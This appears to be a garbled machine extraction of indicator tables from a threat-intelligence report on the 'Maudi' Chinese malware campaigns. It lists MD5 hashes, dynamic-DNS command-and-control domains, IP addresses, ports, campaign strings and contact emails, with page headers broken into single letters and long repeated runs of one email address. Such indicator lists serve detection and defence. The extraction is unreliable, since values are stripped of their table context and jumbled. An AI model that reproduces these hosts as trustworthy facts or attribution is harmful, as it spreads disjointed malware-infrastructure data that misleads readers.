["891d15fd331f79829acb489617333b79", "8cd87b8d5ca0715d1605a70f500924bb", "8f1073b2dba950152fd96a4c5057bc13", "9322ff4e14f75fe3ea032714b5038c20", "93a98e2049ffe3ba660b0eab8827f8bb"], ["96181a03770b612c5f4a57194018ef30"], ["97da1db01d59f2852989a3c152ed39c1"], ["981f9c704c671dc36cf553c4bb620ea7"], ["9c8f0ce512cdb21bf4e4953094bd1e46"], ["9e2dfa8c509ee179d2283fbe8512b6dd", "9f6143aa4b6f50d28f858c70388a3c73"], ["a079ff3fd8fbc398f0361f9105e93733", "a3bfba7870d87f726bb97a85db17942c", "a3ce301622f326fe436e3f275ab7d1be", "a51628c49fc15bec7363d598d749934d"], ["a66fc5a5b1b7fe127140386d784a3e80", "a77fe3562f1c89a1263edbbedec56ca4", "a791342a49c08d22b1a1bd7a93328d77", "a84e6d38f43f0ca50c60731fa6f8f8cc", "ab8be1ed0d1c2ec03c847d43434551f0", "aee71a96f11c183c0ddd424228376dbc", "b18f2c7c1631d94457e3c3226692a5b4", "b52f72a86b621948f1b094334d23c50f", "b7597172097e4105f027e2c65d2eaf64", "b7fb766f3ab6926d9f42c91b649a2943"], ["bbda06be8132e34c5d91e08e55a4d814"], ["bf0aa8e722df5e1f8124d51021206622", "bf87188b9af91a054053ec1becd6eaf0", "c030d67c8696b9cbcc600867363ef9bd", "c7534dcb83991745ab5db0aba47d47cd", "c839ab78db5a0b8715a4f829c845a9c2", "cc10483d846bffbe19f133f951eb908c"], ["cc5ba76ee1cf77f7547632f44c517673", "cf30b0d831d3123027a20520a213a09f", "cf45dbdb3718b4b728c2dd894032464b"], ["cf7df0a7a87fa110262b26571438969d", "d0bc80cb9522ff749185f5493b89dfa1", "d52ef63fdc5c5452d9da23bd6d4bf0f5", "2yanfengjiaoxp.gicp.net", "cttwxsw.gicp.net", "yanfengjiaoxp.gicp.net", "surpriseing.homeftp.org", "qq907433815.3322.org", "qwer.wekby.com"], ["2yanfengjiaoxp.gicp.net", "yanfengjiaoxp.gicp.net"], ["sm888.8800.org"], ["360liveupdate.com", "bmw.webhop.net", "mail.lufare.com", "bmw.webhop.net", "bmw.webhop.net", "yanfengjiaoxp.gicp.net", "okia.3322.org", "2yanfengjiaoxp.gicp.net", "wang2368131.gicp.net"], ["123.151.193.236", "dnsxyz.webhop.net", "yanfengjiaoxp.gicp.net"], ["q944642367.gicp.net", "127.0.0.1", "i_lied@3322.org", "bmw.webhop.net", "df611.gicp.net", "222.134.42.62", "117.40.239.20", "2yanfengjiaoxp.gicp.net", "yanfengjiaoxp.gicp.net", "222.134.42.62", "yanfengjiaoxp.gicp.net", "northsince.homelinux.org", "asiondragon2008.3322.org", "yanfengjiaoxp.gicp.net"], ["360liveupdate.com", "bysex.mooo.com", "2yanfengjiaoxp.gicp.net", "360liveupdate.com", "127.0.0.1", "123.151.193.236", "wang2368131.gicp.net", "dongtaiwang.vicp.net", "yanfengjiaoxp.gicp.net"], ["2yanfengjiaoxp.gicp.net", "2yanfengjiaoxp.gicp.net", "cttwxsw.gicp.net", "dongtaiwang.vicp.net", "bmw.webhop.net", "yahooforusa.vicp.net", "q944642367.gicp.net", "zeropan007.3322.org", "qwer.crabdance.com", "yanfengjiaoxp.gicp.net", "qwer.wekby.com", "360liveupdate.com", "cttwxsw.gicp.net", "360liveupdate.com", "15", "|", "T", "h", "e", "C", "h", "i", "n", "e", "s", "e", "M", "a", "l", "w", "a", "r", "e", "C", "o", "m", "p", "l", "e", "x", "e", "s", ":", "M", "a", "u", "d", "i", "JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com", "JinDiQIAO@hotmail.com", "yanf", "xfish", "yanf"], ["628", "99999", "qwerw", "yanf", "xfish", "stock", "ilove", "newuu", "xml88", "newuu", "newuu", "xfish", "zhanj", "yanf", "8888", "hack", "12345", "xfish", "kor", "xfish", "xfish", "newuu", "12345", "xfish", "lwwn1", "yanf", "xfish", "00001", "xfish", "MOFA", "G1753", "yanf", "ilove", "xserv", "yanf", "526", "xfish", "xfish", "8888", "xfish", "xfish", "yanf", "yanf", "xfish", "xfish", "newuu", "00001", "heilo", "0630", "fanhe", "yanf", "qwerw", "wzq", "xfish", "526", "10010", "80", "1009", "443", "3460", "80", "10010", "10012", "3460", "3460", "80", "8080", "80", "80", "10012", "3460", "10010", "8888", "80", "80", "10012", "6666", "3460", "3460", "80", "3460", "3460", "8071", "10010", "10012", "3460", "10012", "80", "3460", "1009", "3460", "80", "10010", "3460", "3460"], ["50", "8888", "3460", "10012", "10010", "10010", "80", "3460", "80", "443", "3460", "8080", "80", "10009", "80", "3460", "80", "3460", "Norman", "Shark", "d6dbf1ff2d93e95a4379ecc5c71eb709", "d8097ba0e2077ebb841c7b98b48437fb", "db88d89c58f344308c37a08e913caf02", "dd016c17ea3e2dbdefe8bdcf73346cbd", "df41a63c679fe1374aa191ea892e5650", "e10152dd505853dddf59ae570e0a3abb", "e120cdb2811407c48e94098d2190d4e2", "e1ac803a816265db2ace8140e06edad3", "e3984f30a5362bd97a15915bb8ac3ea4", "e3b16d46c81fc7ae23738795cf38f671", "e53f502d82d2ac5558ff59a6f8038db7", "e6408b5120fb53769e8e6faa084966a3", "e78ddb3a1c715a5c93d064bd053a570d", "ea9ff690b68eac6904931b0ab1c60fd4", "ed517981e73a616ba4ab60a16c94cfe0", "f08ca265043bba868ff3133ca9bc74cc", "f2414a1a3994faf0a2a6a68c5e02c7b2", "f3b3438a1a69e7290823492c517a8ee7", "f6df06b5d97cc9185a4b6d3bf36df8dd", "f71627384a8b41062de77ba9aa32928b", "f9eadd5762a634fa703956be48aa69c0", "fa3e62ec64d10a9accb2fa8c580a2efa", "fa72e26105b43349b4b50d127d3614a3", "fad40c701654454f2b1a4abc7c707c06", "0344fb12551a2721ce1642ebbaded310", "0b7c0a464f8eba9da0073bcafb61be88", "128b4d567b1474949c4389785397cc1b", "1b1d855a357c337ea3fdf015265b1445"], ["1ddda11f7521c092ea6095ac3919676d", "364c806a053f29f5dd175d09f373250a", "391479e5579206b6831e00bbf7c99826", "474da1e418763cf0c9fcc0ddecc99928"], ["4e94978943a8c8d41c9b66fa4dc6cfaf", "51de6aad847ba7b38cd7aca8783b1c81", "5a953c5a922885ac0bbb3f8abbecdc2e", "5da12bdd0c23862b68d9599faa4caad7", "728365a26dc9600ef10b2abd5fa11afd"], ["72c28b58aebc7ab97008f803ade71c76"], ["7b019bd7e91874692b510fa8c218e5d9", "8df121cd3b79db7ae772b32d70f6c9d8"], ["90acf5aba3170978dc585640f34d74d3"], ["a6fd61ed931dccc961635b8e43f35215"], ["b6f732c391d34acba419f20eba8efebd"], ["bb2185d8eae91fc105a4d92c6f9cec74", "cddae65009d91d88b49fd6eebd0b28e7"], ["dcf85cd73cca9fc032e055be18375d9a", "f175f7598648471d085f1909d36390ce", "f5c939f6973acae6160b92f32bb2dd27", "f615afeffe7b8da50712f2ef40aff6b9", "fca5b719d18b950e59c6bc66f71e7274", "17981807f7394d78f984b9104584e3ab", "2da5243310403b7fdedbf2911d09ec24", "559f72390ecb028d799b0aea594c9b7d", "070e0226f5d0d588731361c0b5569379", "0f482f1acabe3a980705d66cd6e4bf52"], ["16d2175d190bbbd572cb3e33079f7d72"], ["5cc4daa7d3bd4b17c8067ec8a947ce83"], ["84b5f0cfc4a787d013d8f0f605a876c3", "2yanfengjiaoxp.gicp.net", "360liveupdate.com"], ["mail.lufare.com"], ["qq907433815.3322.org", "127.0.0.1", "surpriseing.homeftp.org", "surpriseing.homeftp.org", "dongtaiwang.vicp.net", "cttwxsw.gicp.net", "bmw.webhop.net", "yanfengjiaoxp.gicp.net", "mail.sufare.com"], ["360liveupdate.com", "yanfengjiaoxp.gicp.net", "bmw.webhop.net", "yzkker.3322.org", "2yanfengjiaoxp.gicp.net", "117.40.239.20", "qq907433815.3322.org", "surpriseing.homeftp.org", "2yanfengjiaoxp.gicp.net", "2yanfengjiaoxp.gicp.net", "services.servebbs.org", "2yanfengjiaoxp.gicp.net", "yanfengjiaoxp.gicp.net", "yanfengjiaoxp.gicp.net", "yanfengjiaoxp.gicp.net", "yanfengjiaoxp.gicp.net", "yanfengjiaoxp.gicp.net", "yanfengjiaoxp.gicp.net", "117.40.239.20", "yanfengjiaoxp.gicp.net", "yanfengjiaoxp.gicp.net", "yanfengjiaoxp.gicp.net", "dnsxyz.webhop.net", "yanfengjiaoxp.gicp.net", "yanfengjiaoxp.gicp.net", "yanfengjiaoxp.gicp.net", "yanfengjiaoxp.gicp.net", "yanfengjiaoxp.gicp.net", "wang2368131.gicp.net", "sm888.8800.org", "yanfengjiaoxp.gicp.net", "yanfengjiaoxp.gicp.net", "yanfengjiaoxp.gicp.net"], ["q944642367.gicp.net", "yanfengjiaoxp.gicp.net", "yanfengjiaoxp.gicp.net", "yanfengjiaoxp.gicp.net", "services.servebbs.org", "qwer.crabdance.com", "qwer.crabdance.com", "qwer.crabdance.com", "2yanfengjiaoxp.gicp.net", "2yanfengjiaoxp.gicp.net", "2yanfengjiaoxp.gicp.net", "2yanfengjiaoxp.gicp.net"], ["2yanfengjiaoxp.gicp.net", "16", "|", "T", "h", "e", "C", "h", "i", "n", "e", "s", "e", "M", "a", "l", "w", "a", "r", "e", "C", "o", "m", "p", "l", "e", "x", "e", "s", ":", "M", "a", "u", "d", "i", "JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com", "JinDiQIAO@hotmail.com", "yanf", "526", "xml88", "60001", "xfish"], ["628", "628", "10406", "xfish", "xlsxx", "xfish", "fax80", "ilove", "yanf", "newuu", "shoes", "yanf", "lwwn1", "99999"], ["628", "yanf", "yanf"], ["IN", "yanf", "xfish", "xfish", "xfish", "xfish", "xfish", "xfish", "lwwn1", "xfish", "xfish", "xfish", "12345", "xfish", "xfish", "xfish", "xfish", "xfish", "8888", "stock", "xfish", "xfish", "xfish", "kor", "xfish", "xfish", "xfish"], ["IN", "fanhe", "fanhe", "fanhe", "yanf", "yanf", "yanf", "yanf", "yanf", "10010", "3460"], ["8080", "3460", "3460", "443", "443", "3460", "80", "80", "10012", "80", "3460", "10009", "80", "3460", "10010", "8071", "3460", "443", "10010", "10010"], ["443", "10010", "10012", "10012", "10012", "10012", "10012", "10012", "8071", "10012", "10012", "10012", "80", "10012", "10012", "10012", "10012", "10012", "8888", "3460", "10012", "10012", "10012", "6666", "10012", "10012", "10012", "443", "50", "50", "50", "10010", "10010", "10010", "10010", "10010", "Norman", "Shark", "a2ce5549749d258a3d53a19ebf0dfef9", "acf4d4159bcb730a6c86469b74326181"], ["f75009f6423433db2fc5673ab278e3d1", "68411315d3321b744552f50d15a97308", "008dc2e22ba7e6f96342a29083344512"], ["00fd48c9ddeb7c7b9271f4a6e0ca4a16", "036a2da8bde3af55f8c492afeeddd65b", "069120f92ffadbfb2a22c6e51a257236", "06f788c2e5285e63545baad22af2e5ce", "06f9e365fe8bbe926c5fd992d1ff4b95"], ["09e49a46ffc9135682740ef0b709a28a"], ["0efb08ce780b5a50749f850805e2d663", "1d35952034267cb1a865ad4f8b76a22c"], ["1e8a59cd725d949a140497d0462b63c7", "21013250e90e559c0b5ab7fd5cd57722", "22b6fbae0b2ecfb51c194b98c1cff692", "24f09152a40c5231f9e006ca3a27dbbb", "2530c356ccaa7272a56145b7300daf80", "269fa8fa755b6d067e9818f89b182042", "26eaf715124382f1ca0c29fc3661d00c"], ["2bd6d0231789b1b207bd18c93fe877bb"], ["2c7ff79125c4b1f02a436010cfd71b21", "2defc101ebccce4baa9779f4fcef53bb", "304e3b07f1d1802488ed80a5be1eaf8d", "317da2fd6635b45570edb2c2df75b0fe", "31b188114c8a75d117e129b2446a9310"], ["320cd6bb76a8cb768de42ba6697e7590", "3215133be590fa47089989502381ca31"], ["34156792fac87719e9c8a4665fe2f9b9", "36895b649536ed3905d3f90e2004f03b", "375b6d4987d015ebf9414c19681001ba", "37f95b4906fb3b6f5935e2a397f69e21", "3c6cce8b6f8d55d931959d39044fab76"], ["40fcdebb382907cbbfaee44f154ecb02"], ["425ee721db80ce85b338a073b37c2e12", "45f569bc817a17f0e0487bb05ae71137"], ["485ecdaa0482b35f510f40f3b2f683ff"], ["4c84d6447587330d544f5200196f2603", "4d0b6f59628d4d3fba569315140dedde"], ["52dd8f9a8be5692014186af755a9257d", "574d3725d5f161b8f7615d8867ee427e", "605accc6bee731be5ac0f6531ac9e8d7"], ["66cfc9d3c6fa3107b0d004789384a6bd", "6b009e689cad6896d28102af04569bf2", "6b475742f795fe8b6439bd931dccf045"], ["6e218ced252ca18ea12a58e8c14ae618"], ["747ad8a7bc8ded87169d1bd40d4f3aa3", "765b599cb055df9034b71e54c795193e", "7ca3acf38cf256650aa8c15ef51fd7cc", "7ccaf82b2594c18f368aa94536448aa3", "83213cf9fe303d916789cef295d07b6b", "84c23286b9b141d2f501a55228de96ee", "8d6b5815157422ee97c01925d72a22ed"], ["919e4ddef8f294dfeb798f7a5e34ba39", "9c29b5ab62f130dedb52e7661a8b3cb3", "9ec832ed678e81a8e0a2c253beeadd00"], ["9f55bc93d26ec674e754545be9513f3d"], ["9ffd9fb7b493aec58f88b823a426d1b0", "2yanfengjiaoxp.gicp.net", "yanfengjiaoxp.gicp.net"], ["2yanfengjiaoxp.gicp.net"], ["oa.sanymh.com", "apple.buypn.com"], ["black204.dyndns-work.com", "dyn-microsoft.blogdns.net", "boyfriend101.kicks-ass.org", "fh.buypn.com", "dongdong603.3322.org", "dongdong603.3322.org", "black204.dyndns-work.com"], ["220.175.13.250"], ["subscription.dyndns-home.com", "dongdong603.3322.org", "a5g17mail.3322.org", "user2011.8800.org", "cat.aumoni.com", "www6.intarnetservice.com", "220.175.13.250", "dnsxyz.dyndns.biz", "220.175.13.250", "user2011.8800.org", "www6.intarnetservice.com", "apple.buypn.com", "wang2368131.gnway.net", "wqdf.3322.org", "dongdong603.3322.org", "dongdong603.3322.org", "114.202.2.83", "p.hannmaill.net", "l2009l20091.3322.org", "dongdong603.3322.org", "mylover.dyndns-free.com", "stop204.3322.org", "friend101.7766.org", "www.microsoft.com", "dongdong603.3322.org", "wang2368131.gnway.net", "dongdong603.3322.org", "s.hiinet.net", "dongdong603.3322.org", "black204.dyndns-work.com", "dongdong603.3322.org", "wang2368131.gnway.net", "dyn-microsoft.blogdns.net", "dongdong603.3322.org", "wang2368131.gnway.net", "friend101.7766.org", "dongdong603.3322.org", "dongdong603.3322.org", "dongdong603.3322.org", "boyfriend101.kicks-ass.org", "dongdong603.3322.org", "rabit.aumoni.com", "manager.serveblog.net", "leftpaper.dyndns.biz"], ["xk.buypn.com", "17", "|", "T", "h", "e", "C", "h", "i", "n", "e", "s", "e", "M", "a", "l", "w", "a", "r", "e", "C", "o", "m", "p", "l", "e", "x", "e", "s", ":"], ["M", "a", "u", "d", "i", "JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com"], ["JinDiQIAO@hotmail.com", "soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com", "yanf", "yanf", "yanf", "szc", "xappl", "0504", "lfish", "xfish", "fanhe", "xfish", "xfish", "0623", "ie0da", "in216", "xfish", "1215", "cfish", "xcm80", "1f2s8", "linze", "yfish", "ie0da", "fish", "1f2s8", "xappl", "xfish", "xiaoc", "xfish", "xfish", "xfish", "xfish", "xfish", "xfish", "fish", "03", "nfish", "update", "xfish", "xfish", "xfish", "xfish", "xfish", "bl", "xfish", "xfish", "lfish", "xfish", "xfish", "nfish", "xfish", "xfish", "xfish", "xfish", "xfish", "syi21", "in926"], ["Lef726", "serve", "10010", "10009", "10010", "3460"], ["80", "80", "8080", "5379", "80", "7777", "7777", "80", "8080", "80", "7777", "6200", "80", "80", "8080", "8080", "80", "8080", "80", "8080", "80", "7188", "3460", "7777", "7777", "7088", "3460", "7750", "7777", "80", "110", "1723", "80", "7777", "7788", "7777", "3460", "7777", "80", "7777", "7188", "8080", "7777", "9900", "1723", "7777", "7777", "7777", "5379", "7777", "21", "80", "80", "80", "Norman", "Shark", "a122dfa22543b04322a4713c5a3a3fc1", "a3cba2c23fccbe9944fbdeeb418a0cbb", "a4b299b309c2f9643bac07c379833b2a", "a54321aa3ff23aba7766f6aa7096d3b0", "a5526d3d01a287410f28b123f3d9688b", "a676a1a444e63fe8d95b9cb1b17cfa4d", "a7db6b46945f322e8b78fc33e6819544", "a9180562680acc35c41ba3e6578d9d7e"], ["afbe79c53bb5cd28345d9888667607ab", "b1f611adc6402aa45770a2e7e1c1e0d8", "bf375d30d08fdecc270a0621d33b439f", "c113015b07587de8f55e6ba1f85a203a", "c30f036f67a82b38e653e07acba56246", "c601b9da3c1761a691a74f525cf7b379", "c7653c7415c30d1eb7b8ce065b76cdc1", "c9bf29d298862c708f2982e82f78c69f", "cbf831cff50212e7cb2b9540204bda06", "cdce8791df7c971cb4e609b27a2b5f8f", "cddd77de9de609568cf11b8cad35d2de"], ["d374631c910fca5df9727d77b0c797ec", "d4bdb78d43fd15cf76ded19216691459", "d556399e1c541af75c39052aac9e6727", "d56cd7a068634fbe2f0d2cbccf2df763", "d68f4f986177ea3baafaabb54f7f3325", "d6e2f6c607564544116f491fc70faa08", "d845ee0d409bd284eb0a8dee67c03f98", "de1a532e2e387d2003d9f7e82e4e6d35"], ["dee184d74a84cf138cc4caa8d3e1b32e", "e76d287a2bf8c4b466875e2da744596c", "e79cbb7590744564c110284294273dac", "e7e48e4212822de6c1c685a1478d7ad5"], ["ea46b3ce1187ea9de89a08c2756fccfc", "ec212491ac34169afe19be9272059c0d", "ec2e8d3e1eeb65e873db7992311b560b", "ef5c8649251816dc77e121d68881cde6", "f0e3c8d6f2f9579ae3cfbad9ae2f6d32", "f1d4dc470b0a0a7ffd4f6bfacf9d1024", "f1f7672498128e0c4839ac9a1093b84c", "f4fea7af0e7a6023f29a01aa06d37aa3", "f5d659ddf4ae5d52eafac621dddc1bab", "f7ee5dd3af96b8847134037b769988c4", "fbbe7e88cf53d225c299996aeb0cbf8f"], ["fc1a61250356ddd94dceaf90169e8256", "ff9eb9ecdb1fc068312d1480354a4d85", "0958d15b1510b394d6a17a7b9f1db69b"], ["0a06d8e4e77a822f47e2fc3ba83ccfe6"], ["10bafddc35c32226171e32a3325a97e4", "11baf7fcbf963ddf8446366f749e7d9e"], ["2b6f563f8cf3b64c1425e04ba7743962"], ["308af461eb46128af9c5589b550a7fb0", "3da84e6e2dd5ab898f6d31fda1d3148e", "46b6a1239dce346b926b8f22521eb8bc", "55824c42743c6fde39f69dd790d640c3"], ["55be601a18eeb89c0d1aedd5a49edae0"], ["6724cbd34516cf79c0361fdaf6a2d77f"], ["6951bedba7f9d7b8003b4c5aae83d0bb", "6e4510000cc03366288c8f12d209d3d7", "88f8eb2caf80e5a5e68e6813d2f75dc8", "mysql.sql01.com"], ["dongdong603.3322.org", "dongdong603.3322.org", "dongdong603.3322.org", "114.202.2.83", "wuliao678.8866.org", "114.202.2.83", "mysql.sql01.com", "xc.winniqi.com", "dongdong603.3322.org", "dongdong603.3322.org", "mysql.sql01.com", "black204.dyndns-work.com"], ["dongdong603.3322.org", "dyn-microsoft.blogdns.net", "single.dyndns.biz", "dongdong603.3322.org", "dnsxyz.dyndns.biz", "l2009l20091.3322.org", "boyfriend101.kicks-ass.org", "dnsxyz.dyndns.biz", "220.175.13.250", "mysql.sql01.com", "dongdong603.3322.org", "bmw.webhop.net", "s.hiinet.net", "xk.buypn.com", "dongdong603.3322.org", "user2011.8800.org", "dongdong603.3322.org", "yunlong123.3322.org", "yhm20060330.3322.org", "wang2368131.gnway.net", "xk.buypn.com", "dongdong603.3322.org", "dongdong603.3322.org", "stop204.3322.org"], ["xc.winniqi.com"], ["dongdong603.3322.org", "dongdong603.3322.org", "dongdong603.3322.org", "p.hannmaill.net", "dongdong603.3322.org", "727609693.gnway.net", "leftpaper.dyndns.biz", "shinubi.chickenkiller.com", "black204.dyndns-work.com", "misson.mysq1.net", "rabit.aumoni.com", "black204.dyndns-work.com", "boyfriend101.kicks-ass.org", "s.hiinet.net", "cat.aumoni.com", "s.hiinet.net", "user2011.8800.org", "dnsluck.3322.org"], ["hostname.dyndns-mail.com", "indiaarmy.djkcc.com", "18", "|"], ["T", "h"], ["e", "C", "h", "i", "n", "e", "s", "e", "M", "a", "l", "w", "a", "r", "e", "C", "o", "m", "p", "l", "e", "x", "e", "s", ":", "M", "a", "u", "d", "i", "soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com"], ["soft@hotmail.com", "12", "xfish", "xfish", "xfish", "xfish", "xfish", "xfish", "1201"], ["x1224", "xfish", "xfish", "1201", "bl", "xfish", "lfish", "jxt61", "xfish", "yfish", "xfish", "xfish", "yfish", "ie0da", "1014", "xfish", "3", "xfish", "serve", "xfish", "xfish", "xfish", "yl", "01", "xfish", "serve", "xfish", "xfish", "03", "x1224", "xfish", "xfish", "xfish", "xfish", "xfish", "xfish", "Lef726", "pk", "0504", "xfish", "syi21", "0623", "xfish", "xfish", "xcm80", "xfish", "fish", "https"], ["in248"], ["dj", "80", "7777"], ["7777"], ["7777", "7088", "12874", "7088", "110", "4000"], ["7777", "7777"], ["110", "80", "7777", "8080", "80", "7777"], ["80", "7750", "5379", "80", "8080", "80", "7777", "80", "3460", "80", "7777", "80", "7777", "3460", "3460", "7188", "80", "7777"], ["7777", "110", "4000"], ["7777"], ["7777", "7777"], ["3460"], ["7777"], ["7777"], ["80", "443", "80", "80", "21", "80", "5379", "3460", "80", "3460", "80", "443", "80", "80", "Norman", "Shark", "9501dcad273c806a06818c8f648f4994", "963ca2e9a82a9fd235de4895043144c0", "baee14a8acf0ef71ef0cbfdda79f0fd6", "cc87e0fe570488a38d76294e969eadc2", "cfd49a32870abec83781249872ed6be4"], ["d52af4bd0c9a66411a562f5c681550a6", "d8b8420ac6da7dee391c2e3a4ae3afdc", "d94fbcc1fa7c9245afba7a3568db61d6", "e10d08a1fb8760881de3ee875240df1e", "f3ed1321e8f2fd6f8c523136dbdb6dd9"], ["f563c267eab33a3e49a73f825e2c0846"], ["f5d0803e3e4ad1d288ca4aedf5d26fba"], ["6b2e6cecc45d3cb7c8d005f1698dcea0", "cf747c51da4d36a6055f48dc804ad9d6"], ["e4b84120c95335f6524dbb2f6b17bb52", "14076b1b50be21f6c2f85acfee2bc24a", "4709cbdb3d990369fe35f1aed45be09e", "543bdf2a8665c9f5ca1bb0b1000c5856", "c6e01836ffd3b229dac4a98b595cb002"], ["0d201e4b7679b99722abca1ed767f13a", "0e95b864771484f833df294f4cbf4e06"], ["3ce828f70dacc390164fcd921c5e8b98", "48791d1cf2165c5d85680aa18b209190", "4cfe7436fecb4a9e5a4621843fc25762", "5c107b4ff5f314623929fffd94021cba"], ["688d1ad103f00400b7f3b92329dd48b7", "6b0609f80e5c37ded32d36380a0b2256"], 